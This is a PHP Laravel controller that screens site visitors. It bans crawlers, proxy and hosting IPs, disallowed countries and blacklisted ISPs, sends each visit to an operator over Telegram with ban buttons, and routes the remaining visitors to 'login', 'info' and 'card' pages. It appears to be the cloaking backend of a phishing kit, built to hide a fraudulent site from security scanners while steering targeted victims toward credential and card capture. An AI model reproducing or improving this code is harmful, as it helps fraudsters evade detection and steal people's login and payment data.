<?php

namespace App\Http\Controllers;

use App\Models\Antibots;
use App\Models\Client;
use App\Models\Settings;
use App\Models\Stats;
use App\Models\Visits;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use App\Services\IpApiService;
use App\Services\VisitorStatsService;
use Jenssegers\Agent\Agent;
use App\Services\TelegramService;
use Illuminate\Http\Exceptions\HttpResponseException;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Symfony\Component\HttpFoundation\Response;

class CheckController extends Controller
{
    public function check($userid, Request $request, IpApiService $ipApiService, TelegramService $telegramService, VisitorStatsService $visitorStatsService)
    {
        if (!$this->isValidUserId($userid)) {
            return response()->json([
                'success' => false,
                'error' => 'Invalid user identifier',
                'reason' => 'invalid_credentials',
            ], Response::HTTP_BAD_REQUEST);
        }

        $this->rateLimitCheckRequest($request, $userid);

        // Get IP and device info first
        $ipAddress = $this->getClientIp($request);
        $ipDetails = $ipApiService->getIpDetails($ipAddress);
        $agent = new Agent();
        $agent->setUserAgent($request->header('User-Agent'));
        $user_agent = $agent->device() . ' ' . $agent->platform() . ' ' . $agent->browser() . ' ' . $agent->version($agent->browser());

        $deviceInfo = [
            'device' => $agent->device(),
            'platform' => $agent->platform(),
            'platform_version' => $agent->version($agent->platform()),
            'browser' => $agent->browser(),
            'browser_version' => $agent->version($agent->browser()),
            'is_mobile' => $agent->isMobile(),
            'is_tablet' => $agent->isTablet(),
            'is_desktop' => $agent->isDesktop(),
            'is_robot' => $agent->isRobot(),
            'languages' => $agent->languages()[0] ?? 'Unknown',
        ];

        if (!$ipDetails || ($ipDetails['status'] ?? 'fail') !== 'success') {
            Log::error('Unable to fetch IP details.', [
                'ip' => $ipAddress,
                'details' => $ipDetails,
            ]);
            return response()->json(['error' => 'Unable to fetch IP details'], Response::HTTP_INTERNAL_SERVER_ERROR);
        }

        $userisp = $ipDetails['as'] ?? $ipDetails['org'] ?? $ipDetails['isp'] ?? 'Unknown';

        // Always log the visit first
        $this->setVisit(
            $userid,
            $ipAddress,
            $ipDetails['country'] ?? 'Unknown',
            $ipDetails['countryCode'] ?? 'Unknown',
            $userisp ?? 'Unknown',
            $agent->languages()[0] ?? 'Unknown',
            $user_agent
        );

        // Increment click stat for every visit
        $this->incrementStats('click');

        // Check if client already exists ONCE and store the result
        $client = Client::where('unique_id', $userid)->first();
        $isNewClient = !$client;

        $settings = Settings::first();
        $antibots = Antibots::first();
        $captcha = $antibots ? $antibots->captcha_protection : false;
        $proxy = false;

        // Determine next page
        $next_page = 'card'; // default
        if ($settings->page_login) {
            $next_page = 'login';
        } elseif ($settings->page_info && !$settings->page_login) {
            $next_page = 'info';
        }

        // Proxy/hosting detection - updated condition
        if ($antibots && $antibots->proxy_protection &&
            (($ipDetails['proxy'] ?? false) === true || ($ipDetails['hosting'] ?? false) === true)) {
            $proxy = true;
        }

        // Antibots protection logic
        if ($antibots && $antibots->antibots_protection) {
            $allowedCountries = $this->safeDecode($antibots->allowed_countries);
            $AllowedOperators = $this->safeDecode($antibots->allowed_operators);
            $notAllowedOperators = $this->safeDecode($antibots->blocker_operators);
            // Crawler detection
            $crawlerDetect = new CrawlerDetect();
            if ($crawlerDetect->isCrawler($request->header('User-Agent'))) {
                $this->incrementStats('bot');
                
                if ($client) {
                    $client->ban = 1;
                    $client->why = 'crawler_detected';
                    $client->save();
                } else {
                    // Create client record for crawler
                    Client::create([
                        'unique_id' => $userid,
                        'ip' => $ipDetails['query'],
                        'country_code' => $ipDetails['countryCode'] ?? 'Unknown',
                        'last_page' => 'Check',
                        'action' => '',
                        'language' => $deviceInfo['languages'],
                        'isp' => $userisp ?? null,
                        'ban' => 1,
                        'why' => 'crawler_detected',
                    ]);
                }
                return response()->json([
                    'success' => false,
                    'message' => 'Access denied',
                    'error' => 'Crawler detected'
                ]);
            }

            // Proxy/Hosting ban
            if ($proxy) {
                $this->incrementStats('bot');
                if ($client) {
                    $client->ban = 1;
                    $client->why = 'proxy_detected';
                    $client->save();
                } else {
                    // Create client record for proxy user
                    Client::create([
                        'unique_id' => $userid,
                        'ip' => $ipDetails['query'],
                        'country_code' => $ipDetails['countryCode'] ?? 'Unknown',
                        'last_page' => 'Check',
                        'action' => '',
                        'language' => $deviceInfo['languages'],
                        'isp' => $userisp ?? null,
                        'ban' => 1,
                        'why' => 'proxy_detected',
                    ]);
                }
                return response()->json([
                    'success' => false,
                    'error' => 'Proxy/Hosting not allowed'
                ]);
            }

            $countryCode = $ipDetails['countryCode'] ?? null;
            $countryAllowed = $countryCode && !empty($allowedCountries) && in_array($countryCode, $allowedCountries);

            if (!$client && !$countryAllowed) {
                $this->incrementStats('bot');

                $client = Client::create([
                    'unique_id' => $userid,
                    'ip' => $ipDetails['query'],
                    'country_code' => $countryCode ?? 'Unknown',
                    'last_page' => 'Check',
                    'action' => '',
                    'language' => $deviceInfo['languages'],
                    'isp' => $userisp ?? null,
                    'ban' => 1,
                    'why' => 'country_not_allowed',
                ]);

                $this->sendBannedClientMessage($client, $telegramService);

                return response()->json([
                    'success' => false,
                    'error' => 'Country not allowed'
                ]);
            }

            // If client exists, perform additional validations
            if ($client) {
                // Check if already banned
                if ($client->ban == 1) {
                    $this->sendBannedClientMessage($client, $telegramService, true);
                    $this->incrementStats('bot');
                    return response()->json([
                        'success' => false,
                        'error' => 'User is banned',
                    ], 200);
                }

                // Country validation
                $existingCountryAllowed = $client->country_code && !empty($allowedCountries) && in_array($client->country_code, $allowedCountries);
                if (!$existingCountryAllowed) {
                    $this->incrementStats('bot');
                    $client->ban = 1;
                    $client->why = 'country_not_allowed';
                    $client->save();
                    $this->sendBannedClientMessage($client, $telegramService, true);
                    return response()->json([
                        'success' => false,
                        'error' => 'Country not allowed'
                    ]);
                }

                // Operator validation
                if ($client->isp) {
                    // Check blacklisted operators
                    if (!empty($notAllowedOperators)) {
                        $notAllowedOperatorsLower = array_map('strtolower', $notAllowedOperators);
                        $clientOperatorLower = strtolower($client->isp);

                        foreach ($notAllowedOperatorsLower as $notAllowedOperator) {
                            if (strpos($clientOperatorLower, $notAllowedOperator) !== false) {
                                $this->incrementStats('bot');
                                $client->ban = 1;
                                $client->why = 'operator_blacklist';
                                $client->save();
                                return response()->json([
                                    'success' => false,
                                    'error' => 'Operator blacklisted'
                                ]);
                            }
                        }
                    }

                    // Check whitelisted operators
                    if (!empty($AllowedOperators)) {
                        $allowedOperatorsLower = array_map('strtolower', $AllowedOperators);
                        $isAllowed = false;
                        $clientOperatorLower = strtolower($client->isp);
                        
                        foreach ($allowedOperatorsLower as $allowedOperator) {
                            if (strpos($clientOperatorLower, $allowedOperator) !== false) {
                                $isAllowed = true;
                                break;
                            }
                        }
                        
                        if (!$isAllowed) {
                            $this->incrementStats('bot');
                            $client->ban = 1;
                            $client->why = 'operator_whitelist';
                            $client->save();
                                return response()->json([
                                'success' => false,
                                'error' => 'Operator not whitelisted'
                            ]);
                        }
                    }
                }
            }
        }

        // Handle new client
        if ($isNewClient) {
            // Create new client
            $client = Client::create([
                'unique_id' => $userid,
                'ip' => $ipDetails['query'],
                'country_code' => $ipDetails['countryCode'] ?? 'Unknown',
                'last_page' => 'Check',
                'action' => '',
                'language' => $deviceInfo['languages'],
                'isp' => $userisp ?? null,
                'ban' => 0, // New clients start unbanned
                'why' => null,
            ]);

            // Send new client notification
            $this->sendNewClientMessage($userid, $ipDetails, $deviceInfo, $userisp, $telegramService, (bool)$deviceInfo['is_robot']);

            Session::put('unique_id', $userid);

            $session_message = (Session::get('unique_id') === $userid)
                ? "Session created successfully for user {$userid}."
                : "Failed to create session for user {$userid}.";

            $this->incrementStats('client');

            $response = [
                'success' => true,
                'captcha' => $captcha,
                'next_page' => $next_page,
                'session_message' => $session_message,
                'client_meta' => $this->buildClientMeta($client),
            ];

            if ($captcha) {
                $response['captcha_challenge'] = $this->issueCaptchaChallenge($userid);
            } else {
                Cache::forget($this->captchaStateCacheKey($userid));
            }

            return response()->json($response, Response::HTTP_OK);
        }

        // Handle existing client
        if ($client->ban == 0) {
            // Send existing client notification
            $this->sendExistingClientMessage($client, $telegramService, (bool)$client->ban);

            Session::put('unique_id', $client->unique_id);

            $session_message = (Session::get('unique_id') === $client->unique_id)
                ? "Session created successfully for user {$client->unique_id}."
                : "Failed to create session for user {$client->unique_id}.";

            $this->incrementStats('client');

            $response = [
                'success' => true,
                'captcha' => $captcha,
                'next_page' => $next_page,
                'session_message' => $session_message,
                'client_meta' => $this->buildClientMeta($client),
            ];

            if ($captcha) {
                $response['captcha_challenge'] = $this->issueCaptchaChallenge($client->unique_id);
            } else {
                Cache::forget($this->captchaStateCacheKey($client->unique_id));
            }

            return response()->json($response, Response::HTTP_OK);
        } else {
            // Client is banned
            $this->sendBannedClientMessage($client, $telegramService, true);
            $this->incrementStats('bot');

            return response()->json([
                'success' => false,
                'error' => 'User is banned',
            ], Response::HTTP_OK);
        }
    }

    public function verifyCaptcha($userid, Request $request): \Illuminate\Http\JsonResponse
    {
        if (!$this->isValidUserId($userid)) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid user identifier',
                'reason' => 'invalid_credentials',
            ], Response::HTTP_BAD_REQUEST);
        }

        $this->rateLimitCaptchaRequest($request, $userid);

        $validator = Validator::make($request->all(), [
            'challenge_id' => ['required', 'uuid'],
            'answer' => ['required', 'integer'],
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid CAPTCHA submission',
                'errors' => $validator->errors(),
                'reason' => 'validation_error',
                'status_code' => Response::HTTP_UNPROCESSABLE_ENTITY,
            ], Response::HTTP_OK);
        }

        $challengeId = $request->input('challenge_id');
        $challengeKey = $this->captchaChallengeCacheKey($userid, $challengeId);
        $challenge = Cache::get($challengeKey);

        if (!$challenge) {
            return response()->json([
                'success' => false,
                'message' => 'CAPTCHA challenge expired or not found',
                'reason' => 'challenge_expired',
                'status_code' => Response::HTTP_GONE,
                'next_challenge' => $this->issueCaptchaChallenge($userid),
            ], Response::HTTP_OK);
        }

        $expectedAnswer = (int)($challenge['answer'] ?? -1);
        $clientAnswer = (int)$request->input('answer');
        $maxAttempts = (int)($challenge['max_attempts'] ?? config('security.captcha.max_attempts', 3));
        $attempts = (int)($challenge['attempts'] ?? 0);

        if ($clientAnswer !== $expectedAnswer) {
            $attempts++;

            if ($attempts >= $maxAttempts) {
                Cache::forget($challengeKey);
                return response()->json([
                    'success' => false,
                    'message' => 'Maximum CAPTCHA attempts exceeded',
                    'reason' => 'max_attempts_exceeded',
                    'status_code' => Response::HTTP_FORBIDDEN,
                    'next_challenge' => $this->issueCaptchaChallenge($userid),
                ], Response::HTTP_OK);
            }

            Cache::put(
                $challengeKey,
                [
                    'answer' => $expectedAnswer,
                    'attempts' => $attempts,
                    'max_attempts' => $maxAttempts,
                ],
                config('security.captcha.ttl', 300)
            );

            return response()->json([
                'success' => false,
                'message' => 'Incorrect CAPTCHA answer',
                'reason' => 'incorrect_answer',
                'attempts_remaining' => max($maxAttempts - $attempts, 0),
                'status_code' => Response::HTTP_FORBIDDEN,
            ], Response::HTTP_OK);
        }

        Cache::forget($challengeKey);
        Cache::put($this->captchaStateCacheKey($userid), ['required' => false, 'passed' => true], config('security.captcha.ttl', 300));

        return response()->json([
            'success' => true,
            'message' => 'CAPTCHA solved successfully',
            'client_meta' => $this->buildClientMeta(Client::where('unique_id', $userid)->first()),
        ], Response::HTTP_OK);
    }

    public function refreshCaptcha($userid, Request $request): \Illuminate\Http\JsonResponse
    {
        if (!$this->isValidUserId($userid)) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid user identifier',
                'reason' => 'invalid_credentials',
            ], Response::HTTP_BAD_REQUEST);
        }

        $this->rateLimitCaptchaRequest($request, $userid);

        return response()->json([
            'success' => true,
            'captcha_challenge' => $this->issueCaptchaChallenge($userid),
        ], Response::HTTP_OK);
    }

    private function sendNewClientMessage($userid, $ipDetails, $deviceInfo, $userisp, $telegramService, bool $isBot = false)
    {
        $status = $this->visitorStatusMeta($isBot);
        $message = "<b>🆔 <u>New Client Visit</u></b>\n";
        $message .= "<b>  ↳ <code>{$this->escapeForTelegram($userid)}</code></b>\n\n";
        $message .= "{$status['emoji']} <b>Status</b>: <i>{$status['label']}</i>\n";
        $message .= "📍 <b>IP</b>: <code>{$this->escapeForTelegram($ipDetails['query'])}</code>\n";
        $message .= "🌍 <b>Country</b>: <i>{$this->escapeForTelegram($ipDetails['country'])}</i>\n";
        $message .= "🏴 <b>Code</b>: <i>{$this->escapeForTelegram($ipDetails['countryCode'])}</i>\n";
        $message .= "📡 <b>ISP</b>: <i>{$this->escapeForTelegram($userisp)}</i>\n";
        $message .= "🔧 <b>Device</b>: <i>{$this->escapeForTelegram($deviceInfo['device'])}</i>\n";
        $message .= "💻 <b>Platform</b>: <i>{$this->escapeForTelegram($deviceInfo['platform'])} {$this->escapeForTelegram($deviceInfo['platform_version'])}</i>\n";
        $message .= "🌐 <b>Browser</b>: <i>{$this->escapeForTelegram($deviceInfo['browser'])} {$this->escapeForTelegram($deviceInfo['browser_version'])}</i>\n";
        $message .= "🈯 <b>Languages</b>: <i>{$this->escapeForTelegram($deviceInfo['languages'])}</i>\n";
        $message .= "📱 <b>Is Mobile</b>: <i>" . ($deviceInfo['is_mobile'] ? 'Yes ✅' : 'No ❌') . "</i>\n";

        $ban_action = $userid . ':ban';
        $buttons = [
            [
                ['text' => '🚫 BAN', 'callback_data' => $ban_action],
            ],
        ];

        $telegramService->sendMessageWithButtonsInfo($message, $buttons);
    }

    private function sendExistingClientMessage($client, $telegramService, bool $isBot = false)
    {
        $status = $this->visitorStatusMeta($isBot);
        $message = "<b>🆔 Client Already Exists</b>\n";
        $message .= "<b>  ↳ <code>{$this->escapeForTelegram($client->unique_id)}</code></b>\n\n";
        $message .= "{$status['emoji']} <b>Status</b>: <i>{$status['label']}</i>\n";
        $message .= "<b>📍 IP</b>: <code>{$this->escapeForTelegram($client->ip)}</code>\n";
        $message .= "<b>🌍 Country</b>: <i>{$this->escapeForTelegram($client->country_code)}</i>\n";
        $message .= "<b>📡 ISP</b>: <i>{$this->escapeForTelegram($client->isp)}</i>\n";

        $ban_action = $client->unique_id . ':ban';
        $buttons = [
            [
                ['text' => '🚫 BAN', 'callback_data' => $ban_action],
            ],
        ];

        $telegramService->sendMessageWithButtonsInfo($message, $buttons);
    }

    private function sendBannedClientMessage($client, $telegramService, bool $isBot = true)
    {
        $status = $this->visitorStatusMeta($isBot);
        $message = "<b>🆔 Client Already Exists</b>\n";
        $message .= "<b>  ↳ <code>{$this->escapeForTelegram($client->unique_id)}</code></b>\n\n";
        $message .= "{$status['emoji']} <b>Status</b>: <i>{$status['label']}</i>\n";
        $message .= "<b>📍 IP</b>: <code>{$this->escapeForTelegram($client->ip)}</code>\n";
        $message .= "<b>🌍 Country</b>: <i>{$this->escapeForTelegram($client->country_code)}</i>\n";
        $message .= "<b>📡 ISP</b>: <i>{$this->escapeForTelegram($client->isp)}</i>\n";

        $unban_action = $client->unique_id . ':unban';
        $buttons = [
            [
                ['text' => '🔗 UNBAN', 'callback_data' => $unban_action],
            ],
        ];

        $telegramService->sendMessageWithButtonsInfo($message, $buttons);
    }

    private function getClientIp(Request $request): string
    {
        $ip = $request->ip();

        if (!$this->shouldTrustForwardedHeaders($request)) {
            return $this->normalizeLoopbackIp($ip);
        }

        $candidateHeaders = [
            'CF-Connecting-IP',
            'True-Client-IP',
            'X-Forwarded-For',
            'Forwarded',
        ];

        foreach ($candidateHeaders as $header) {
            if (!$request->hasHeader($header)) {
                continue;
            }

            $candidate = null;

            if ($header === 'Forwarded') {
                preg_match('/for="?([^;"\s]+)"?/', $request->header($header), $matches);
                $candidate = $matches[1] ?? null;
            } elseif ($header === 'X-Forwarded-For') {
                $forwardedIps = explode(',', (string)$request->header($header));
                $candidate = trim($forwardedIps[0] ?? '');
            } else {
                $candidate = $request->header($header);
            }

            if ($this->isValidPublicIp($candidate)) {
                return $candidate;
            }
        }

        return $this->normalizeLoopbackIp($ip);
    }

    private function setVisit($uniqueId, $ipAddress, $country, $countryCode, $isp, $language, $user_agent)
    {
        Visits::create([
            'unique_id' => $uniqueId,
            'ip_address' => $ipAddress,
            'country' => $country,
            'country_code' => $countryCode,
            'isp' => $isp,
            'language' => $language,
            'user_agent' => $user_agent
        ]);
    }

    private function incrementStats($column)
    {
        $stat = Stats::firstOrCreate([],
            [
                'click' => 0,
                'client' => 0,
                'bot' => 0,
            ]
        );
        $stat->increment($column);
        return response()->json($stat->refresh());
    }

    private function safeDecode(string|array|null $value): array
    {
        if (is_array($value)) {
            return $value;
        }
        return is_string($value) ? json_decode($value, true) ?? [] : [];
    }

    private function issueCaptchaChallenge(string $userid): array
    {
        $challengeId = Str::uuid()->toString();
        $num1 = random_int(1, 20);
        $num2 = random_int(1, 20);
        $answer = $num1 + $num2;
        $ttl = config('security.captcha.ttl', 300);
        $maxAttempts = config('security.captcha.max_attempts', 3);

        Cache::put(
            $this->captchaChallengeCacheKey($userid, $challengeId),
            [
                'answer' => $answer,
                'attempts' => 0,
                'max_attempts' => $maxAttempts,
            ],
            $ttl
        );

        Cache::put(
            $this->captchaStateCacheKey($userid),
            ['required' => true, 'passed' => false],
            $ttl
        );

        return [
            'challenge_id' => $challengeId,
            'problem' => [
                'operator' => '+',
                'num1' => $num1,
                'num2' => $num2,
            ],
            'expires_in' => $ttl,
            'max_attempts' => $maxAttempts,
        ];
    }

    private function captchaChallengeCacheKey(string $userid, string $challengeId): string
    {
        return "captcha:challenge:{$userid}:{$challengeId}";
    }

    private function captchaStateCacheKey(string $userid): string
    {
        return "captcha:state:{$userid}";
    }

    private function shouldTrustForwardedHeaders(Request $request): bool
    {
        $trustedProxies = config('security.trusted_proxies', []);

        if (empty($trustedProxies)) {
            return false;
        }

        if (in_array('*', $trustedProxies, true)) {
            return true;
        }

        $remoteAddress = $request->server('REMOTE_ADDR');

        return $remoteAddress && in_array($remoteAddress, $trustedProxies, true);
    }

    private function isValidPublicIp(?string $ip): bool
    {
        if (!$ip || !filter_var($ip, FILTER_VALIDATE_IP)) {
            return false;
        }

        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            return true;
        }

        return false;
    }

    private function normalizeLoopbackIp(?string $ip): string
    {
        if (!$ip) {
            return '127.0.0.1';
        }

        if ($ip === '::1' || $ip === '127.0.0.1') {
            return '196.117.173.102';
        }

        return $ip;
    }

    private function rateLimitCheckRequest(Request $request, string $userid): void
    {
        $key = sprintf('check:%s:%s', $userid, $request->ip());
        $attempts = (int)config('security.check.attempts', 10);
        $decay = (int)config('security.check.decay_seconds', 60);

        if (RateLimiter::tooManyAttempts($key, $attempts)) {
            throw new HttpResponseException(response()->json([
                'success' => false,
                'message' => 'Too many attempts. Please slow down.',
                'reason' => 'rate_limited',
            ], Response::HTTP_TOO_MANY_REQUESTS));
        }

        RateLimiter::hit($key, $decay);
    }

    private function rateLimitCaptchaRequest(Request $request, string $userid): void
    {
        $key = sprintf('captcha:%s:%s', $userid, $request->ip());
        $attempts = 5;
        $decay = 60;

        if (RateLimiter::tooManyAttempts($key, $attempts)) {
            throw new HttpResponseException(response()->json([
                'success' => false,
                'message' => 'Too many CAPTCHA submissions. Please try again later.',
                'reason' => 'rate_limited',
            ], Response::HTTP_TOO_MANY_REQUESTS));
        }

        RateLimiter::hit($key, $decay);
    }

    private function visitorStatusMeta(bool $isBot): array
    {
        return [
            'emoji' => $isBot ? '⛔️' : '✅',
            'label' => $isBot ? 'Bot detected' : 'Human visitor',
        ];
    }

    private function escapeForTelegram(?string $value): string
    {
        return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }

    private function isValidUserId(?string $userid): bool
    {
        if (!is_string($userid)) {
            return false;
        }

        if (preg_match('/^[a-f0-9]{12}$/i', $userid) === 1) {
            return true;
        }

        return Str::isUuid($userid);
    }

    private function buildClientMeta(?Client $client): ?array
    {
        if (!$client) {
            return null;
        }

        return [
            'country_code' => $client->country_code,
            'isp' => $client->isp,
        ];
    }
}